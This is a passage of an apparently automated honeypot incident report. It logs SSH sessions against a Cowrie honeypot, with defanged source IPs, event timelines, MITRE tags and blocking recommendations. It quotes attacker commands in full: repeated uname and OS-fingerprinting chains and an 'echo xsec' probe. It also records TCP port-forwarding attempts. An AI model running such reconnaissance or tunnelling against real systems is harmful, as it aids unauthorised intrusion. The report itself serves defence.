- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0085cb5b95ac

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:36 |
| **Last Seen** | 2026-08-15 00:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:36:05` | `cowrie.session.connect` |
| `2026-08-15 00:36:05` | `cowrie.client.version` |
| `2026-08-15 00:36:05` | `cowrie.client.kex` |
| `2026-08-15 00:36:06` | `cowrie.login.success` |
| `2026-08-15 00:36:08` | `cowrie.session.params` |
| `2026-08-15 00:36:08` | `cowrie.command.input` |
| `2026-08-15 00:36:08` | `cowrie.command.input` |
| `2026-08-15 00:36:08` | `cowrie.command.input` |
| `2026-08-15 00:36:08` | `cowrie.command.input` |
| `2026-08-15 00:36:08` | `cowrie.command.input` |
| `2026-08-15 00:36:08` | `cowrie.command.success` |
| `2026-08-15 00:36:08` | `cowrie.command.input` |
| `2026-08-15 00:36:08` | `cowrie.command.input` |
| `2026-08-15 00:36:08` | `cowrie.command.input` |
| `2026-08-15 00:36:08` | `cowrie.command.input` |
| `2026-08-15 00:36:08` | `cowrie.log.closed` |
| `2026-08-15 00:36:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891e7e623122

| Field | Detail |
|---|---|
| **Source IP** | `183.104.220[.]84` |
| **First Seen** | 2026-08-15 00:36 |
| **Last Seen** | 2026-08-15 00:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:36:45` | `cowrie.session.connect` |
| `2026-08-15 00:36:45` | `cowrie.client.version` |
| `2026-08-15 00:36:45` | `cowrie.client.kex` |
| `2026-08-15 00:36:47` | `cowrie.login.success` |
| `2026-08-15 00:36:48` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:36:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.104.220[.]84` to AbuseIPDB if not already reported
- [ ] Block `183.104.220[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410bf55c980a

| Field | Detail |
|---|---|
| **Source IP** | `220.122.115[.]9` |
| **First Seen** | 2026-08-15 00:36 |
| **Last Seen** | 2026-08-15 00:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:36:53` | `cowrie.session.connect` |
| `2026-08-15 00:36:53` | `cowrie.client.version` |
| `2026-08-15 00:36:53` | `cowrie.client.kex` |
| `2026-08-15 00:36:55` | `cowrie.login.success` |
| `2026-08-15 00:36:56` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:37:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.122.115[.]9` to AbuseIPDB if not already reported
- [ ] Block `220.122.115[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aa6c2755605

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:38 |
| **Last Seen** | 2026-08-15 00:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:38:06` | `cowrie.session.connect` |
| `2026-08-15 00:38:06` | `cowrie.client.version` |
| `2026-08-15 00:38:06` | `cowrie.client.kex` |
| `2026-08-15 00:38:08` | `cowrie.login.success` |
| `2026-08-15 00:38:09` | `cowrie.session.params` |
| `2026-08-15 00:38:09` | `cowrie.command.input` |
| `2026-08-15 00:38:09` | `cowrie.command.input` |
| `2026-08-15 00:38:09` | `cowrie.command.input` |
| `2026-08-15 00:38:09` | `cowrie.command.input` |
| `2026-08-15 00:38:09` | `cowrie.command.input` |
| `2026-08-15 00:38:09` | `cowrie.command.success` |
| `2026-08-15 00:38:09` | `cowrie.command.input` |
| `2026-08-15 00:38:09` | `cowrie.command.input` |
| `2026-08-15 00:38:09` | `cowrie.command.input` |
| `2026-08-15 00:38:09` | `cowrie.command.input` |
| `2026-08-15 00:38:10` | `cowrie.log.closed` |
| `2026-08-15 00:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf16dc6e2047

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-08-15 00:38 |
| **Last Seen** | 2026-08-15 00:43 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:38:07` | `cowrie.session.connect` |
| `2026-08-15 00:38:07` | `cowrie.client.version` |
| `2026-08-15 00:38:07` | `cowrie.client.kex` |
| `2026-08-15 00:38:10` | `cowrie.login.success` |
| `2026-08-15 00:38:10` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc2fc084cde

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 00:39 |
| **Last Seen** | 2026-08-15 00:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:39:46` | `cowrie.session.connect` |
| `2026-08-15 00:39:46` | `cowrie.client.version` |
| `2026-08-15 00:39:46` | `cowrie.client.kex` |
| `2026-08-15 00:39:46` | `cowrie.login.success` |
| `2026-08-15 00:39:47` | `cowrie.session.params` |
| `2026-08-15 00:39:47` | `cowrie.command.input` |
| `2026-08-15 00:39:47` | `cowrie.log.closed` |
| `2026-08-15 00:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21955247aca9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:39 |
| **Last Seen** | 2026-08-15 00:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:39:59` | `cowrie.session.connect` |
| `2026-08-15 00:39:59` | `cowrie.client.version` |
| `2026-08-15 00:39:59` | `cowrie.client.kex` |
| `2026-08-15 00:40:00` | `cowrie.login.success` |
| `2026-08-15 00:40:02` | `cowrie.session.params` |
| `2026-08-15 00:40:02` | `cowrie.command.input` |
| `2026-08-15 00:40:02` | `cowrie.command.input` |
| `2026-08-15 00:40:02` | `cowrie.command.input` |
| `2026-08-15 00:40:02` | `cowrie.command.input` |
| `2026-08-15 00:40:02` | `cowrie.command.input` |
| `2026-08-15 00:40:02` | `cowrie.command.success` |
| `2026-08-15 00:40:02` | `cowrie.command.input` |
| `2026-08-15 00:40:02` | `cowrie.command.input` |
| `2026-08-15 00:40:02` | `cowrie.command.input` |
| `2026-08-15 00:40:02` | `cowrie.command.input` |
| `2026-08-15 00:40:03` | `cowrie.log.closed` |
| `2026-08-15 00:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d0e72b7db0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:41 |
| **Last Seen** | 2026-08-15 00:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:41:51` | `cowrie.session.connect` |
| `2026-08-15 00:41:51` | `cowrie.client.version` |
| `2026-08-15 00:41:51` | `cowrie.client.kex` |
| `2026-08-15 00:41:52` | `cowrie.login.success` |
| `2026-08-15 00:41:53` | `cowrie.session.params` |
| `2026-08-15 00:41:53` | `cowrie.command.input` |
| `2026-08-15 00:41:53` | `cowrie.command.input` |
| `2026-08-15 00:41:53` | `cowrie.command.input` |
| `2026-08-15 00:41:53` | `cowrie.command.input` |
| `2026-08-15 00:41:53` | `cowrie.command.input` |
| `2026-08-15 00:41:53` | `cowrie.command.success` |
| `2026-08-15 00:41:53` | `cowrie.command.input` |
| `2026-08-15 00:41:53` | `cowrie.command.input` |
| `2026-08-15 00:41:53` | `cowrie.command.input` |
| `2026-08-15 00:41:53` | `cowrie.command.input` |
| `2026-08-15 00:41:53` | `cowrie.log.closed` |
| `2026-08-15 00:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a08a7514577

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-15 00:43 |
| **Last Seen** | 2026-08-15 00:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:43:13` | `cowrie.session.connect` |
| `2026-08-15 00:43:13` | `cowrie.client.version` |
| `2026-08-15 00:43:13` | `cowrie.client.kex` |
| `2026-08-15 00:43:13` | `cowrie.login.success` |
| `2026-08-15 00:43:13` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:43:14` | `cowrie.direct-tcpip.data` |
| `2026-08-15 00:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb776238c968

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:43 |
| **Last Seen** | 2026-08-15 00:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:43:48` | `cowrie.session.connect` |
| `2026-08-15 00:43:48` | `cowrie.client.version` |
| `2026-08-15 00:43:48` | `cowrie.client.kex` |
| `2026-08-15 00:43:49` | `cowrie.login.success` |
| `2026-08-15 00:43:50` | `cowrie.session.params` |
| `2026-08-15 00:43:50` | `cowrie.command.input` |
| `2026-08-15 00:43:50` | `cowrie.command.input` |
| `2026-08-15 00:43:50` | `cowrie.command.input` |
| `2026-08-15 00:43:50` | `cowrie.command.input` |
| `2026-08-15 00:43:50` | `cowrie.command.input` |
| `2026-08-15 00:43:50` | `cowrie.command.success` |
| `2026-08-15 00:43:50` | `cowrie.command.input` |
| `2026-08-15 00:43:50` | `cowrie.command.input` |
| `2026-08-15 00:43:50` | `cowrie.command.input` |
| `2026-08-15 00:43:50` | `cowrie.command.input` |
| `2026-08-15 00:43:51` | `cowrie.log.closed` |
| `2026-08-15 00:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7169bbd5eedb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:45 |
| **Last Seen** | 2026-08-15 00:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:45:47` | `cowrie.session.connect` |
| `2026-08-15 00:45:47` | `cowrie.client.version` |
| `2026-08-15 00:45:47` | `cowrie.client.kex` |
| `2026-08-15 00:45:48` | `cowrie.login.success` |
| `2026-08-15 00:45:49` | `cowrie.session.params` |
| `2026-08-15 00:45:49` | `cowrie.command.input` |
| `2026-08-15 00:45:49` | `cowrie.command.input` |
| `2026-08-15 00:45:49` | `cowrie.command.input` |
| `2026-08-15 00:45:49` | `cowrie.command.input` |
| `2026-08-15 00:45:49` | `cowrie.command.input` |
| `2026-08-15 00:45:49` | `cowrie.command.success` |
| `2026-08-15 00:45:49` | `cowrie.command.input` |
| `2026-08-15 00:45:49` | `cowrie.command.input` |
| `2026-08-15 00:45:49` | `cowrie.command.input` |
| `2026-08-15 00:45:49` | `cowrie.command.input` |
| `2026-08-15 00:45:50` | `cowrie.log.closed` |
| `2026-08-15 00:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a968d0620f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:47 |
| **Last Seen** | 2026-08-15 00:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:47:49` | `cowrie.session.connect` |
| `2026-08-15 00:47:49` | `cowrie.client.version` |
| `2026-08-15 00:47:49` | `cowrie.client.kex` |
| `2026-08-15 00:47:50` | `cowrie.login.success` |
| `2026-08-15 00:47:51` | `cowrie.session.params` |
| `2026-08-15 00:47:51` | `cowrie.command.input` |
| `2026-08-15 00:47:51` | `cowrie.command.input` |
| `2026-08-15 00:47:51` | `cowrie.command.input` |
| `2026-08-15 00:47:51` | `cowrie.command.input` |
| `2026-08-15 00:47:51` | `cowrie.command.input` |
| `2026-08-15 00:47:51` | `cowrie.command.success` |
| `2026-08-15 00:47:51` | `cowrie.command.input` |
| `2026-08-15 00:47:51` | `cowrie.command.input` |
| `2026-08-15 00:47:51` | `cowrie.command.input` |
| `2026-08-15 00:47:51` | `cowrie.command.input` |
| `2026-08-15 00:47:52` | `cowrie.log.closed` |
| `2026-08-15 00:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5189b0dbe576

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-08-15 00:49 |
| **Last Seen** | 2026-08-15 00:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:49:00` | `cowrie.session.connect` |
| `2026-08-15 00:49:00` | `cowrie.client.version` |
| `2026-08-15 00:49:00` | `cowrie.client.kex` |
| `2026-08-15 00:49:01` | `cowrie.login.success` |
| `2026-08-15 00:49:01` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b865767f5d1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:49 |
| **Last Seen** | 2026-08-15 00:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:49:54` | `cowrie.session.connect` |
| `2026-08-15 00:49:54` | `cowrie.client.version` |
| `2026-08-15 00:49:54` | `cowrie.client.kex` |
| `2026-08-15 00:49:56` | `cowrie.login.success` |
| `2026-08-15 00:49:57` | `cowrie.session.params` |
| `2026-08-15 00:49:57` | `cowrie.command.input` |
| `2026-08-15 00:49:57` | `cowrie.command.input` |
| `2026-08-15 00:49:57` | `cowrie.command.input` |
| `2026-08-15 00:49:57` | `cowrie.command.input` |
| `2026-08-15 00:49:57` | `cowrie.command.input` |
| `2026-08-15 00:49:57` | `cowrie.command.success` |
| `2026-08-15 00:49:57` | `cowrie.command.input` |
| `2026-08-15 00:49:57` | `cowrie.command.input` |
| `2026-08-15 00:49:57` | `cowrie.command.input` |
| `2026-08-15 00:49:57` | `cowrie.command.input` |
| `2026-08-15 00:49:58` | `cowrie.log.closed` |
| `2026-08-15 00:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b11ed8be994

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:51 |
| **Last Seen** | 2026-08-15 00:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:51:49` | `cowrie.session.connect` |
| `2026-08-15 00:51:50` | `cowrie.client.version` |
| `2026-08-15 00:51:50` | `cowrie.client.kex` |
| `2026-08-15 00:51:51` | `cowrie.login.success` |
| `2026-08-15 00:51:52` | `cowrie.session.params` |
| `2026-08-15 00:51:52` | `cowrie.command.input` |
| `2026-08-15 00:51:52` | `cowrie.command.input` |
| `2026-08-15 00:51:52` | `cowrie.command.input` |
| `2026-08-15 00:51:52` | `cowrie.command.input` |
| `2026-08-15 00:51:52` | `cowrie.command.input` |
| `2026-08-15 00:51:52` | `cowrie.command.success` |
| `2026-08-15 00:51:52` | `cowrie.command.input` |
| `2026-08-15 00:51:52` | `cowrie.command.input` |
| `2026-08-15 00:51:52` | `cowrie.command.input` |
| `2026-08-15 00:51:52` | `cowrie.command.input` |
| `2026-08-15 00:51:52` | `cowrie.log.closed` |
| `2026-08-15 00:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27f04324f243

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 00:53 |
| **Last Seen** | 2026-08-15 00:54 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
